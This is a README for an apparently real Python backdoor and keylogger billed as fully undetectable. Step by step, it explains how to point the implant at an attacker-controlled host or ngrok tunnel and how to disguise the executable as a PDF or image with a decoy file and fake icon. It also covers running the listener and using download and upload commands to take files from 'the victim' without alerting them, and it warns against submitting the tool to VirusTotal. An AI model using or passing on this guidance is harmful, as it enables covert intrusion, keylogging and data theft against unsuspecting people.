# FUD-Python-Backdoor
### <b><u>Note</u></b>: The developer does not take responsibility for any actions undertaken by the individual using this application. Please do not upload on online virus checkers like `Virustotal`.
### <b>FUD as of April 26 2020</b>

## <a id="introduction" style="color: rgb(0,0,0)"><u> Introduction</u></a>:
Imagine you're a burglar casing a house for a potential robbery. You see a "Protected by…" security sign staked in the front lawn and Ring doorbell camera. Being the crafty cat burglar that you are, you hop the fence leading to the back of the house. You see there's a backdoor, cross your fingers, and try the knob—it's unlocked. To the casual observer, there are no external signs of a burglary. In fact, there's no reason you couldn't rob this house through the same backdoor again, assuming you don't ransack the place.

Computer backdoors work in much the same way.

In the world of cybersecurity, a backdoor refers to any method by which authorized and unauthorized users are able to get around normal security measures and gain high level user access (aka root access) on a computer system, network, or software application. Once they're in, cybercriminals can use a backdoor to steal personal and financial data, install additional malware, and hijack devices.

Read more here: <a href="https://www.malwarebytes.com/backdoor/"> Malwarebytes Blog </a>

## How to use it?
The files provided in the repo are raw python coded files. The most important one for you is the `data.py` file.

### <a id="preparation" style="color: rgb(0,0,0)"><u> Preparation</u></a>:
Before we use the backdoor, we need the following things:
1. A host that you control having a static IP or a subscription service with a dynamic DNS client. You can also use a tunnelling service such as `ngrok`.
Find the links in the <a href="#references">references</a> section.
2. Now that you have the public IP/dynamic DNS configured, setup the firewall to allow a port that you want the traffic to be received to (on the host you control)
3. Open the `data.py` file and put these values in the respective fields.
Note that there are other data values but you do not need to change them
4. Have a file that you want the victim to open ready - a pdf or a jpg etc. <u> Note the name and full path of the file</u> on the host computer where you will compile this backdoor
5. Input this file name in the double quotes given in `data.py`
6. If you want the keylogger to send you mails periodically, add your `email` and `password` in the `data.py`. You can also change the `time` variable in seconds to denote in how much time the mail needs to be sent to you.
Note: The initial mail will be sent to you when you switch on the Keylogger. All the subsequent mails will be in the interval `time` seconds.

### <a id="converting" style="color: rgb(0,0,0)"><u>Converting into an Executable</u></a>:
1. We will use the `pyinstaller` module for this. Make sure you have python3.7 installed on the host system you control 
    ``` sh
    pip3 install pyinstaller
    ```
2. Run the following command to combine the file as one and run it:
    ``` sh
    pyinstaller --add-data "<Full-Path>;." --icon "<Full-Pathto-ico-File>" --one-file --noconsole <Name of the base py file>
    ```
    <b> Substitute `<Full-Path>` with the path where your .jpg or .pdf file is located in the host computer you control. Similarly substitute `<Full-Pathto-ico-File>` with the ico file you want the victim to see (For eg: The ico file can be the Adobe PDF icon). </b>

    <b> The `<Name of the base py file>` is the base py file that will be run in the victim machine. Substitute `ConnectBdoor.py` in its place for the file to work as this is the main py file. If you change the name of this py file, make sure you change it while creating the .exe as well!! </b>

### <a id="Running" style="color: rgb(0,0,0)"><u>Running the Backdoor</u></a>:
1. Run the `listen.py` file in the host computer you control.
2. Run the executable in the victim machine. You will see that the front file opens (One that we added as the `<Full-Path>` above).
3. You will see an incoming connection on your host machine.
4. Use popular windows cmd commands like `dir` which work perfectly fine.

#### List of Commands:
1. `download` - This command takes 2 arguments.
    Full syntax: 
    ``` sh
    download <Full File Path in Victim Machine> <Full Path in Host Machine>
    ```
    <b><u>Note</u></b>: The <b>Full paths</b> need to be given in `double quotes`. Or if you want to download a file in the current folder, you may use just the `Filename`. In this case <b>no double quotes are needed</b>.
 Only the first argument is compulsory!

2. `upload`- This command takes 2 arguments.
    Full syntax: 
    ``` sh
    upload <Full File Path in Host Machine> <Full Path in Victim Machine>
    ```
    <b><u>Note</u></b>: The <b>Full paths</b> need to be given in `double quotes`. Or if you want to upload a file in the current folder of where the Backdoor is located on the <b>Victim Machine</b>, you may use just the `Filename`. In this case <b>no double quotes are needed</b>. (You may not know where the victim has downloaded and executed the file from - eg: If they executed the backdoor from the desktop, if you upload the file by not giving your desired full path, all your files will be uploaded to the desktop and can alert the user!)

3. `cd` - This command takes a single argument.
    Full syntax: 
    ``` sh
    cd <Full-Path of Folder in double Quotes or FolderName>
    ```
    <b><u>Note</u></b>: Full path needs to be given in case the user wants to change to a folder not in current directory. Can also use `cd ..` if one wants to go to previous directory.

4. `pwd` - Prints the Present Working Directory and does not take any arguments!

### <a id="references" style="color: rgb(0,0,0)"><u>References</u></a>:
Some links where you can setup a host machine to receive connections:
1. <b>Option 1</b>: Use Cloud VMs - Cheap and effective way to get a public IP and a working machine in the cloud, accessible from anywhere. [For experimenting and legal activities it is perfectly fine. Please do not use the machine for illegal activities like spying on your boss, etc.]. Some examples: <a href="cloud.google.com">Google Cloud</a>, <a href="aws.amazon.com">AWS</a>, <a href="linode.com">Linode</a>, <a href="digitalocean.com">DigitalOcean</a>

2. <b>Option 2</b>: Use Dynamic DNS. Find the <a href="https://www.noip.com/download">link</a> to configure it on your local machine. Put the static DNS name in place of the IP in `data.py`. Make sure the DNS client and your firewall allows incoming connections on the desired port.

3. <b>Option 3</b>: Use Ngrok to open a tcp port into your local machine. Learn how to do that from the <a href="ngrok.com">official site</a>.

You are all set. Have fun! Feel free to fork the repo and use it to further your knowledge. Please use it for research purposes and not indulge in unethical means!
